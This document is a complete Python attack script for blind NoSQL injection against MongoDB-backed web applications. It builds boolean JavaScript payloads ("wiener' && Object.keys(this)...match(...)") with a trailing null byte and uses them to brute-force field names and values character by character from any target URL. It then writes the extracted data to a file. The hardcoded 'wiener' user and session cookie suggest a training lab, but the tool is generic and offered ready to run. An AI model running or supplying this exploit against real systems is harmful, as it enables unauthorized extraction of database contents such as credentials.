#!/usr/bin/python3

from pwn import *
import requests, signal, sys, string, argparse, urllib3
from urllib.parse import quote_plus

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def initialize_session(proxy_url, verify_ssl):
    session = requests.Session()
    
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Cookie': 'session=uBWvqeketsfzMA5exE3LyNg8LMbDF9Pp'
    })
    
    if proxy_url:
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        session.proxies = proxies
        session.verify = False
        
    elif not verify_ssl:
        session.verify = False
    
    return session

def make_request(session, url, payload):
    try:
        encoded_payload = quote_plus(payload, safe='')
        response = session.get(
            f"{url}{encoded_payload}%00",
            timeout=300,
            allow_redirects=False
        )
        return "wiener" in response.text
    except requests.exceptions.RequestException as e:
        log.error(f"Error during request: {e}")
        return False

def escape_character(character):
    if character == '\\':
        return '\\\\\\\\'
    elif character in '.^$*+?{}[]|()':
        return '\\\\' + character
    return character

def get_number_of_fields(session, url):
    progress_bar = log.progress("Enumerating number of fields")
    progress_bar.status("Starting brute-force attack")
    
    count = 0
    while True:
        payload = f"wiener' && Object.keys(this).length=={count}"
        
        progress_bar.status(payload)
        
        if make_request(session, url, payload):
            log.success(f"Fields found: {count}")
            progress_bar.success("Completed")
            return count
        
        count += 1

def get_field_lengths(session, url, total_fields):
    field_lengths_list = []
    print()
    progress_bar = log.progress("Enumerating field lengths")
    
    for current_field_index in range(total_fields):
        current_length = 0
        
        while True:
            payload = f"wiener' && Object.keys(this)[{current_field_index}].length=={current_length}"
            
            progress_bar.status(payload)
            
            if make_request(session, url, payload):
                field_lengths_list.append(current_length)
                log.success(f"Field {current_field_index}: {current_length}")
                break
            
            current_length += 1
    
    progress_bar.success("Completed")
    return field_lengths_list

def get_field_names(session, url, field_lengths_list):
    characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
    field_names_list = []
    print()
    progress_bar = log.progress("Enumerating field names")
    
    for current_field_index, current_field_length in enumerate(field_lengths_list):
        if current_field_length is None or current_field_length == 0:
            log.warning(f"Skipping field {current_field_index} (invalid length)")
            field_names_list.append(None)
            continue
        
        extracted_field_name = ""
        field_progress_bar = log.progress(f"Field {current_field_index}")
        
        for current_position in range(current_field_length):
            character_found = None
            
            for character in characters:
                escaped_character = escape_character(character)
                
                payload = f"wiener' && Object.keys(this)[{current_field_index}].match('^.{{{current_position}}}{escaped_character}.*')"
                
                progress_bar.status(payload)
                
                if make_request(session, url, payload):
                    extracted_field_name += character
                    character_found = character
                    field_progress_bar.status(extracted_field_name)
                    break
            
            if character_found is None:
                log.warning(f"Could not find character at position {current_position} for field {current_field_index}")
                extracted_field_name += "?"
                field_progress_bar.status(extracted_field_name)
        
        field_names_list.append(extracted_field_name)
        field_progress_bar.success(extracted_field_name)
    
    progress_bar.success("Completed")
    return field_names_list

def get_field_value_lengths(session, url, field_names_list, field_indexes):
    field_value_lengths = {}
    print()
    progress_bar = log.progress("Enumerating field value lengths")
    
    for current_field_index in field_indexes:
        current_field_name = field_names_list[current_field_index]
        if current_field_name is None:
            log.warning(f"Skipping field (invalid name)")
            field_value_lengths[current_field_name] = None
            continue
        
        current_value_length = 0
        
        while True:
            payload = f"wiener' && this.{current_field_name}.valueOf().toString().length=={current_value_length}"
            
            progress_bar.status(payload)
            
            if make_request(session, url, payload):
                field_value_lengths[current_field_name] = current_value_length
                log.success(f"Field {current_field_index}: {current_value_length}")
                break
            
            current_value_length += 1
    
    progress_bar.success("Completed")
    return field_value_lengths

def get_field_value_names(session, url, field_names_list, field_value_lengths, field_indexes):
    characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
    field_values = {}
    print()
    progress_bar = log.progress("Enumerating field values")
    
    for current_field_index in field_indexes:
        current_field_name = field_names_list[current_field_index]
        if current_field_name is None:
            log.warning(f"Skipping field (invalid name)")
            field_values[current_field_name] = None
            continue
        
        current_value_length = field_value_lengths.get(current_field_name)
        if current_value_length is None or current_value_length == 0:
            log.warning(f"Skipping field {current_field_index} (invalid value length)")
            field_values[current_field_name] = None
            continue
        
        extracted_field_value = ""
        field_progress_bar = log.progress(f"Field {current_field_index}")
        
        for current_position in range(current_value_length):
            character_found = None
            
            for character in characters:
                escaped_character = escape_character(character)
                
                payload = f"wiener' && this.{current_field_name}.valueOf().toString().match('^.{{{current_position}}}{escaped_character}.*')"
                
                progress_bar.status(payload)
                
                if make_request(session, url, payload):
                    extracted_field_value += character
                    character_found = character
                    field_progress_bar.status(extracted_field_value)
                    break
            
            if character_found is None:
                log.warning(f"Could not find character at position {current_position} for field {current_field_index}")
                extracted_field_value += "?"
                field_progress_bar.status(extracted_field_value)
        
        field_values[current_field_name] = extracted_field_value
        field_progress_bar.success(extracted_field_value)
    
    progress_bar.success("Completed")
    return field_values

def prompt_field_selection(total_fields, field_names_list):
    field_indexes = []
    
    while not field_indexes:
        print()
        user_input = input(f"[?] Enter field indexes to dump (0-{total_fields-1}, comma-separated) or 'all' for all fields: ").strip()
        
        if user_input.lower() == "all":
            field_indexes = [index for index, name in enumerate(field_names_list) if name is not None]
            break
        else:
            try:
                indexes = [int(index.strip()) for index in user_input.split(',')]
                valid_indexes = []
                invalid_index_found = False
                
                for index in indexes:
                    if 0 <= index < len(field_names_list) and field_names_list[index] is not None:
                        valid_indexes.append(index)
                    else:
                        log.warning(f"Invalid or unavailable field index: {index}")
                        invalid_index_found = True
                
                if invalid_index_found:
                    log.warning("Please enter only valid field indexes.")
                    continue
                
                if valid_indexes:
                    field_indexes = valid_indexes
                else:
                    log.warning("No valid field indexes selected. Please try again.")
            except ValueError:
                log.warning("Invalid input. Please enter numbers separated by commas or 'all'.")
    
    return field_indexes

def save_and_display_results(field_indexes, field_names_list, field_values, output_file):
    print()
    log.info("Fields and values")
    
    results_found = False
    
    try:
        with open(output_file, 'w') as file_handler:
            for field_index in field_indexes:
                field_name = field_names_list[field_index]
                field_value = field_values.get(field_name, None)
                
                if field_name is not None and field_value is not None:
                    log.info(f"{field_name}:{field_value}")
                    file_handler.write(f"{field_name}:{field_value}\n")
                    results_found = True
                else:
                    log.warning(f"Field {field_index}: Could not be determined")
                    file_handler.write(f"Field {field_index}: Could not be determined\n")
        
        if not results_found:
            log.warning("No valid results found. File created but empty.")
            return False
        
        log.info(f"Results saved to {output_file}")
        return True
    except Exception as e:
        log.error(f"Failed to save results: {e}")
        return False

def main(url, proxy_url=None, verify_ssl=True, output_file='fields.txt'):
    session = initialize_session(proxy_url, verify_ssl)
    
    total_fields = get_number_of_fields(session, url)
    if total_fields is None:
        log.error("Failed to enumerate number of fields")
        return
    
    field_lengths_list = get_field_lengths(session, url, total_fields)
    if not field_lengths_list:
        log.error("Failed to enumerate field lengths")
        return
    
    field_names_list = get_field_names(session, url, field_lengths_list)
    if not field_names_list:
        log.error("Failed to enumerate field names")
        return
    
    field_indexes = prompt_field_selection(total_fields, field_names_list)
    if not field_indexes:
        log.error("No valid field indexes selected")
        return
    
    field_value_lengths = get_field_value_lengths(session, url, field_names_list, field_indexes)
    if not field_value_lengths:
        log.error("Failed to enumerate field value lengths")
        return
    
    field_values = get_field_value_names(session, url, field_names_list, field_value_lengths, field_indexes)
    if not field_values:
        log.error("Failed to enumerate field values")
        return
    
    save_and_display_results(field_indexes, field_names_list, field_values, output_file)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='MongoDB Fields Enumeration via NoSQL Injection',
        add_help=False
    )
    
    parser.add_argument('-h', '--help', 
                        action='help', 
                        help='Show this help message and exit')
    
    parser.add_argument('-u', '--url', 
                        required=True, 
                        metavar='', 
                        help='Target URL (e.g. https://example.com/user/lookup?user=)')
    
    parser.add_argument('-p', '--proxy', 
                        metavar='', 
                        help='Proxy URL (e.g. http://127.0.0.1:8080)')
    
    parser.add_argument('-k', '--insecure',
                        action='store_true',
                        help='Disable SSL certificate verification (for self-signed certificates/invalid certificates)')
    
    parser.add_argument('-o', '--output', 
                        default='fields.txt', 
                        metavar='', 
                        help='Output file (default: fields.txt)')
    
    args = parser.parse_args()
    
    main(url=args.url, proxy_url=args.proxy, verify_ssl=not args.insecure, output_file=args.output)
